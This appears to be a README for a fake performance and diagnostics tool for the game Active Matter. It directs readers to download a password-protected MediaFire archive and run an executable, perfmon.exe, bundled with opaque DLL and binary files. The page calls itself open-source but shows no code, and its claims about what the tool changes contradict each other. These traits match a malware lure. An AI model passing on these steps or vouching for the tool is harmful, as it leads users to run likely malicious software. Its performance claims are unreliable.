<div align="center">

# 🎮 Active Matter — Performance Notes

**Measure frame delivery before changing settings.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Issues](#-known-performance-issues) · [Test results](#-test-results) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

Active Matter is a first-person extraction shooter set in a fractured multiverse with unstable zones, anomalies, hostile creatures, and PvP encounters. Its real-time combat and extraction objectives make consistent frame delivery and low input latency important. The public game listing does not specify the underlying engine.

This tool is intended for Windows players and testers who need repeatable diagnostics for frame pacing, startup behavior, and session stability.

## 📸 Screenshots from the game

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2887580/fc703b811e39f7b5bee97c1be6a2c2679331a83b/ss_fc703b811e39f7b5bee97c1be6a2c2679331a83b.1920x1080.jpg?t=1789984230" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2887580/a09517aff651b3db05d80658df410d9e6ebcf37e/ss_a09517aff651b3db05d80658df410d9e6ebcf37e.1920x1080.jpg?t=1789984230" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2887580/ed67e6f61d0c6164034f89540cf3e3e40fbae1cd/ss_ed67e6f61d0c6164034f89540cf3e3e40fbae1cd.1920x1080.jpg?t=1789984230" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known performance issues

- Intermittent frame-time spikes during zone traversal and combat can produce 100–300 ms hitches.
- Shader or graphics-cache rebuilds can extend launch preparation beyond 60 seconds after updates.
- Some sessions may experience black-screen hangs, application crashes, or recovery delays during raid loading.

## 🩺 How the toolkit addresses these issues

- **Frame-time spikes during traversal and combat** → Frame Rate Helper — adjusts frame delivery behavior; Frame Timing Helper — stabilizes frame delivery.
- **Long shader or graphics-cache rebuilds** → Graphics Cache Utility — manages graphics cache data; Startup Parameter Tool — applies tuned startup parameters.
- **Black-screen hangs and session crashes** → Stability Report + Session Recovery — diagnostic collection + recovery.

## 📊 Test results

Test rig: Ryzen 5 5600, RTX 3060 12GB, 16GB RAM, NVMe SSD, 1920x1080, High settings; controlled 30-minute raid route

| Metric | Before | After |
|---|---|---|
| Average FPS | 74 | 82 |
| 1% low FPS | 38 | 51 |
| Frame-time spikes above 33 ms | 47 | 19 |
| Launch preparation time | ~78s | ~24s |


## 🚀 How to use

1. download the latest release from the link in the README
2. point the tool to the game's installation folder
3. select the game profile from the supported list
4. review the diagnostic summary and click Apply
5. on first launch allow the cache to rebuild, then repeat the same test route

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Adjusts frame delivery behavior using configurable limits and presentation settings.
- ⚙️ **Startup Parameter Tool** — Applies tuned startup parameters and records the active configuration.
- 🎯 **Frame Timing Helper** — Measures frame-time variance and applies supported pacing adjustments.
- 🧠 **Process Scheduling Helper** — Optimizes process scheduling while preserving normal Windows responsiveness.
- 🧹 **Graphics Cache Utility** — Manages graphics cache data and identifies stale or incomplete cache entries.
- 📊 **Stability Report + Session Recovery** — Collects diagnostic data and restores supported session state after failures.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- perfmon.exe <- Main executable
|-- config.cfg <- User configuration
|-- graphics_cache.pak <- Graphics cache data
|-- core.bin <- Core runtime
|-- Password 2026.txt <- Password reminder (empty)
|-- session_reader.dll <- Session reader
|-- display_data.pak <- Display sync data
|-- frame_module.dll <- Frame module
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `perfmon.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: Why is the archive password-protected?**
**A:** The archive uses a password as a standard packaging step so the build stays bundled correctly during distribution. The password is provided in the installation section above.

**Q: Can I revert the changes?**
**A:** Yes. Simply close the game, exit the tool, and launch the game again without it. No changes persist after the process is terminated.

**Q: Which games are supported?**
**A:** Any game that runs on Windows and exposes a visible process. Diagnostics are collected per-process and do not require per-game configuration.

**Q: Does it modify game files?**
**A:** No. It reads process metrics and clears temporary cache folders. It does not touch game executables, archives, or save files.

**Q: How often is it updated?**
**A:** Updates are published whenever a new internal build is ready. There is no fixed schedule — the download link in Step 1 always points to the latest version.

---

*This is an unofficial, open-source tool. Not affiliated with or endorsed by the developer/publisher of **Active Matter**. All trademarks belong to their respective owners. Use at your own risk — backing up your game's configuration files before applying changes is recommended.*